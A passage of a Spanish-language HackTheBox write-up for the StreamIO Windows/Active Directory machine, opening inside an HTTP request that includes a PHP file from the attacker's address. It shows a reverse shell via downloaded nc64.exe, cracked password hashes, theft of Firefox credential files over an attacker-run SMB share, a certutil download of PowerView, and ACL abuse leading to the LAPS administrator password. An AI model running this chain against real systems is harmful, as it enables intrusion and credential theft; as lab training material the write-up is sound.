Cookie: PHPSESSID=v7gdl9svjj4rsn9mrkif807cd4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 35

include=http://10.10.14.188/rce.php
```

Aquí es donde todo se conecta:

1. El servidor víctima recibe el POST y como ahora sí tiene el `Content-Type` correcto, PHP rellena `$_POST['include']` con el valor `http://10.10.14.188:80/rce.php`.
2. `isset($_POST['include'])` es `true`, y como el valor no es `"index.php"`, entra en la rama del `eval()`.
3. `file_get_contents("http://10.10.14.188:80/rce.php")` → el servidor víctima hace una petición HTTP GET a tu Kali (por eso ves en tu log `GET /rce.php HTTP/1.0 200`) y descarga el contenido del archivo — el código PHP que escribiste.
4. `eval(...)` ejecuta ese código como si fuera parte legítima de la aplicación PHP corriendo en el servidor.
5. Esas líneas `system(...)` se ejecutan en el **sistema operativo Windows del servidor**, no en tu Kali. Por eso el servidor mismo hace la segunda petición GET a `/nc64.exe` (lo ves en tu log también), lo descarga con `wget` (alias de PowerShell) y lo guarda en disco.
6. Se ejecuta `nc64.exe` en el servidor con `-e powershell`, que abre una conexión saliente hacia tu Kali:4445.
7. Tu `nc -lnvp 4445` recibe esa conexión entrante y te da una PowerShell interactiva en la máquina víctima.

<p align="center">
<img src="images/yoshihide.png" width="600" alt="Resultado de Nmap">
</p>

### Shell como nikk37

#### Enumeración

**Yoshihide** no tiene un directorio personal en esta máquina, pero hay otros usuarios:

<p align="center">
<img src="images/usersssssss.png" width="600" alt="Resultado de Nmap">
</p>

#### streamio_backup DB

Cuando se realizó el **sqli** aparte de encontrar la bbdd **StreamIO** también se encontraba otra bbdd llamada **streamio_backup** vamos a proceder a meternos desde esta shell pero antes habra que encontrar unas credenciales válida, para ello me situo en **C:\inetpub\streamio.htb** y realizó este comando:

> Busca recursivamente todos los archivos PHP desde aquí y muéstrame las líneas que contienen `database`

```
dir -recurse *.php | select-string -pattern "database"
```

<p align="center">
<img src="images/creeddbadmiiiin.png" width="600" alt="Resultado de Nmap">
</p>

He obtenido las nuevas credenciales **db_admin**:**B1@hx31234567890**

Luego averiguo si en este sistema está instalado la herramienta **sqlcmd**

> `sqlcmd` es el equivalente a usar la herramienta de línea de comandos de MySQL

```
where.exe sqlcmd
```

<p align="center">
<img src="images/instaladooo.png" width="600" alt="Resultado de Nmap">
</p>

Hay que tener en cuenta lo siguiente: No puedo usarlo de forma interactiva con mi shell, pero sí puedo ejecutar comandos individuales a través de la línea de comandos, utilizando ciertos argumentos de línea de comandos.

Instrucciones de uso:

- `-S localhost` - Servidor al que conectarse
- `-U db_admin` - el usuario con el que conectar
- `-P B1@hx31234567890` - Contraseña del usuario
- `-d streamio_backup` - Base de datos a utilizar
- `-Q [query]` - Consulta para ejecutar y luego salir

```
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```

Son las mismas dos tablas que en la base de datos principal:

<p align="center">
<img src="images/tablaaaas.png" width="600" alt="Resultado de Nmap">
</p>

```
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
```

La tabla `users` tienen algunos usuarios diferentes con respecto a la copia de seguridad original.

<p align="center">
<img src="images/StreamIOusershashhhhh.png" width="600" alt="Resultado de Nmap">
</p>

**Listado de usuario, hash y contraseña**

Para descifrar los hash de los usuarios, usaré esta pagina [desecriptar](https://hashes.com/en/decrypt/hash)

- nikk37:389d14cb8e4e9b94b137deb1caf0612a --> `get_dem_girls2@yahoo.com`         
- yoshihide:b779ba15cedfd22a023c4d8bcf5f2332 --> `66boysandgirls..`        
- Theodore:925e5408ecb67aea449373d668b7359e --> `L3m0n@de`                        
- Lauren:08344b85b329d7efd611b7a7743e8a09 --> `##123a8j8w5123##`          
- Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5 --> `!!sabrina$`

Con la contraseña obtenidas de los hashes de los usuarios intento probar si alguno sirve para **smb** ninguno funciona.

```
netexec smb streamIO.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
netexec smb streamIO.htb -u yoshihide -p '66boysandgirls..'
netexec smb streamIO.htb -u Theodore -p 'L3m0n@de'
netexec smb streamIO.htb -u Lauren -p '##123a8j8w5123##'
netexec smb streamIO.htb -u Sabrina -p '!!sabrina$'
```

A continuación pruebo que usuario me sirve con **netexec**

```
netexec smb streamIO.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

<p align="center">
<img src="images/StreamIOmetexecsmb.png" width="600" alt="Resultado de Nmap">
</p>

```
netexec winrm streamIO.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

<p align="center">
<img src="images/pwned!.png" width="600" alt="Resultado de Nmap">
</p>

#### Shell

```
evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.129.51.170
```

<p align="center">
<img src="images/usertxt.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

### Obtener usuario JDgodd

#### Enumeracion

Al revisar los programas instalados en la máquina anfitriona, noto que Firefox es interesante, ya que no es una opción común en las máquinas de HackTheBox.

<p align="center">
<img src="images/StreamIOfirefooox.png" width="600" alt="Resultado de Nmap">
</p>

Resulta que el usuario **nikk37** tiene perfil en firefox

<p align="center">
<img src="images/StreamIOfirefoxprofiles.png" width="600" alt="Resultado de Nmap">
</p>

El primero es bastante vacío, pero el segundo incluye todos los archivos estándar:

<p align="center">
<img src="images/StreamIObr53rxeg.png" width="600" alt="Resultado de Nmap">
</p>

#### ¿Qué son `profiles.ini`, `logins.json` y `key4.db`?

Cuando usamos **Firefox** en un ordenador (ya sea en Windows o en Linux), el navegador guarda tus datos personales (historial, cookies, marcadores y contraseñas guardadas) dentro de una carpeta específica de tu perfil de usuario.

- **`profiles.ini` (El mapa de los perfiles):** Firefox te permite crear varios perfiles de usuario. Este archivo de texto es un "mapa" que le indica a Firefox **dónde está la carpeta exacta** donde se guardan los datos de ese perfil (suele tener un nombre extraño de 8 caracteres aleatorios seguido de un punto y el nombre del perfil, por ejemplo: `a1b2c3d4.default-release`).

- **`logins.json` (Las credenciales cifradas):** Aquí es donde Firefox guarda los sitios web que visitas, tus nombres de usuario y **tus contraseñas**.

    - _¿Están en texto plano?_ No, por seguridad **están cifradas**. Firefox no guarda tu contraseña tal cual la escribiste; utiliza una clave criptográfica para protegerla.

- **`key4.db` (La llave del cofre):** Este archivo es una base de datos de SQLite que contiene **la clave de cifrado** necesaria para descifrar lo que hay dentro de `logins.json`.

    - _¿El problema de seguridad?_ Por defecto, si el usuario no ha puesto una "Contraseña Maestra" (Master Password) en su Firefox, esa llave está protegida solo por el cifrado nativo del sistema operativo usando credenciales locales estándar. Si un atacante tiene acceso de lectura a los archivos del usuario, puede robarse tanto el `logins.json` como el `key4.db`.

#### servidor SMB compartido

Necesito dos archivos del perfil, `key4.db` y `logins.json` . Inicializaré un servidor SMB en mi ordenador, iniciaré el comando dentro de la carpeta share 

```
smbserver.py share . -user dani -pass dani -smb2support 
```

<p align="center">
<img src="images/smbser-py.png" width="600" alt="Resultado de Nmap">
</p>

Luego, montaré el recurso compartido en StreamIO y copiaré los archivos allí.

```
net use \\10.10.14.188\share /u:dani dani

copy key4.db \\10.10.14.188\share\

copy logins.json \\10.10.14.188\share

dir \\10.10.14.188\share\
```

<p align="center">
<img src="images/StreamIOsmbcompartido.png" width="600" alt="Resultado de Nmap">
</p>

#### Obtención credenciales

Luego usaremos el script [firepwd.py](https://github.com/lclevy/firepwd), es la herramienta que "traduce" esos archivos binarios indescifrables a una lista limpia de contraseñas que puedes usar para iniciar sesión en otros servicios o escalar privilegios. Para ello, necesito prepararme un **entorno virtual**

```
python3 -m venv venv

source venv/bin/activate
```

Luego, dentro del entorno virtual, me instalo dos librerías esenciales.

```
python3 -m pip install pycryptodome

python3 -m pip install pyasn1 
```

Por último, ejecutamos el script

```
python firepwd.py
```

Obtengo las siguientes creds:

```
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

**Listado de usuario, hash y contraseña**

- admin:JDg0dd1s@d0p3cr3@t0r
- nikk37:n1kk1sd0p3t00:)1
- yoshihide:paddpadd@12
- JDgodd:password@12

Observo una cosa y es que tanto el usuario **JDgodd** como la contraseña del usuario **admin** empieza como igual **JDg0dd1s@d0p3cr3@t0r** voy aprobar ademas, esta combinación también:

```
netexec smb streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
```

<p align="center">
<img src="images/smbwinrm.png" width="600" alt="Resultado de Nmap">
</p>

Este usuario tiene habilitado smb pero no tiene habilitado el winrm :(

### Shell como Administrator

#### Bloodhound 

```
bloodhound-python -d 'streamIO.htb' -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -gc 'streamIO.htb' -dc 'DC.streamIO.htb' -ns 10.129.51.170 -c all --zip
```

Una vez insertado el **.zip** dentro de **bloodhound**. En el apartado **PATHFINDING** preparo una ruta que vaya del usuario **JDGODD** a **ADMINISTRATOR** y obtengo lo siguiente:

<p align="center">
<img src="images/StreamIOesquemajgoadc.stream.png" width="600" alt="Resultado de Nmap">
</p>

1. **El punto de partida**: `JDGODD@STREAMIO.HTB`

- Es el usuario actual desde el que partes (o cuyas credenciales has conseguido comprometer). Es un usuario estándar de Active Directory (`Active Directory | User`).

 1. **El primer salto**: `WriteOwner` hacia `CORE STAFF@STREAMIO.HTB`

- **¿Qué significa `WriteOwner`?** Es un permiso peligroso de Control de Access Control List (ACL). Significa que tu usuario (`JDGODD`) tiene el privilegio de **cambiar el propietario** de ese grupo (`CORE STAFF@STREAMIO.HTB`).

- **Cómo se explota:** Al poder cambiar el propietario del grupo, puedes hacerte dueño de él y, a continuación, otorgarte permisos completos sobre el mismo (como `GenericAll` o `AddMember`), lo que te permite **añadirte a ti mismo al grupo** `CORE STAFF`.

1. **El segundo salto**: `ReadLAPSPassword` hacia `DC.STREAMIO.HTB`

- Una vez que formes parte del grupo `CORE STAFF`, heredas o adquieres los permisos que ese grupo posee.

- **¿Qué significa `ReadLAPSPassword`?** El grupo `CORE STAFF` tiene permisos para leer la contraseña de **LAPS** (Local Administrator Password Solution) del controlador de dominio (`DC.STREAMIO.HTB`).

- **Cómo se explota:** LAPS gestiona las contraseñas del administrador local de las máquinas del dominio. Al tener permiso para leer la contraseña de LAPS del Domain Controller (`DC`), podrás obtener la contraseña en texto plano (o hash) de la cuenta de administrador local de esa máquina crítica.

```
certutil.exe -urlcache -f http://10.10.14.188/powerview.ps1 .\powerview.ps1
```

#### WriteOwner explotación

- Crea una cadena segura (`SecureString`) con la contraseña que conseguiste previamente (en este caso, la que descubriste en el perfil de Firefox).
    
- Empaqueta el nombre de usuario (`streamio.htb\JDgodd`) junto con esa contraseña en un objeto de credenciales (`PSCredential`) de PowerShell para que los siguientes comandos puedan autenticarse automáticamente contra el dominio sin pedirte contraseña cada vez.

```
. .\PowerView.ps1

$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```

- Aprovecha los permisos que tiene mi usuario sobre el grupo **"Core Staff"** (vistos en BloodHound).

- Con esta función modificas la ACL del objeto para otorgar permisos de control/propietario a mi usuario (`JDgodd`) sobre dicho grupo, dándote el control necesario para modificar sus miembros en el siguiente paso.

```
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
```

Una vez que tienes el control o los permisos sobre el grupo `Core Staff`, este comando **añade a mi usuario** (`StreamIO\JDgodd`) dentro de los miembros de ese grupo.

```
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

#### Obteniendo pass de Administrator

Luego, en mi kali usando la herramienta **netexec** tiene un párametro que nos sirve para obtener la pass del usuario administrator

```
netexec smb streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```

<p align="center">
<img src="images/StreamIOcredsadminsitrator.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> administrator:`NZ+J+o+i]A%3HR`

El usuario administrator es válido para winrm

```
netexec winrm streamIO.htb -u administrator -p 'NZ+J+o+i]A%3HR'
```

<p align="center">
<img src="images/StreamIOwinrmadministrator.png" width="600" alt="Resultado de Nmap">
</p>

Observo que en el grupo administrator está el usuario **Martin**

<p align="center">
<img src="images/StreamIOmartin.png" width="600" alt="Resultado de Nmap">
</p>

#### Shell

```
evil-winrm -u administrator -p 'NZ+J+o+i]A%3HR' -i 10.129.51.170
```

<p align="center">
<img src="images/root.txt.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

StreamIO es una máquina **Windows/Active Directory de dificultad media** cuya explotación se basa principalmente en una cadena de vulnerabilidades web y una posterior escalada de privilegios en el dominio. El punto de entrada es una **SQL Injection** en `watch.streamIO.htb`, que permite extraer usuarios y hashes de la base de datos. Entre las credenciales obtenidas, `Yoshihide` permite acceder al panel administrativo.

Desde el panel se identifica una vulnerabilidad de **LFI** en el parámetro `debug`, que permite acceder al código de `master.php`. Este contiene una combinación insegura de `file_get_contents()` y `eval()`, lo que deriva en **RCE** y permite obtener una shell en el servidor. Posteriormente, mediante la enumeración del sistema y de la base de datos `streamio_backup`, se obtiene acceso como `nikk37`.

La escalada continúa aprovechando las **credenciales almacenadas en el perfil de Firefox** de `nikk37`, obteniendo las credenciales de `JDgodd`. Con BloodHound se descubre que `JDgodd` posee el permiso **WriteOwner** sobre el grupo `Core Staff`. Tras obtener el control de este grupo, se aprovecha el permiso **ReadLAPSPassword** para recuperar la contraseña del administrador local.

Finalmente, las credenciales obtenidas permiten autenticarse como **`Administrator` mediante WinRM**, consiguiendo el control total de la máquina.
